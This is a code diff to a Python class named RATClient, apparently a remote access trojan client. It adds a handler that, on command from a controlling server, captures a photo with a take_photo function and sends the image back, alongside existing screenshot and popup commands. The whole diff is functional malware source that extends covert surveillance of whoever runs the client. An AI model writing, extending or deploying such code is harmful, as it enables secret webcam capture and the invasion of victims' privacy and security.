@@ -15,6 +15,7 @@ sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
 
 from modules.screenshot import take_screenshot
 from modules.popup import show_popup, show_info_popup, show_warning_popup, show_error_popup
+from modules.photo import take_photo
 
 # Import protocol from server directory
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
@@ -107,6 +108,9 @@ class RATClient:
             elif cmd == Commands.POPUP:
                 self.handle_popup_command(parsed)
                 
+            elif cmd == Commands.PHOTO:
+                self.handle_photo_command()
+                
             elif cmd == Commands.QUIT:
                 self.running = False
                 
@@ -154,6 +158,21 @@ class RATClient:
             
         except Exception as e:
             self.send_error(f"Popup error: {e}")
+    
+    def handle_photo_command(self):
+        """Handle photo command"""
+        try:
+            print("[*] Taking photo...")
+            photo_data = take_photo()
+            
+            if photo_data:
+                self.send_response(ResponseTypes.PHOTO, photo_data)
+                print("[+] Photo sent")
+            else:
+                self.send_error("Photo capture failed")
+                
+        except Exception as e:
+            self.send_error(f"Photo error: {e}")
     
     def send_response(self, response_type: str, payload=None):
         """Send response to server"""
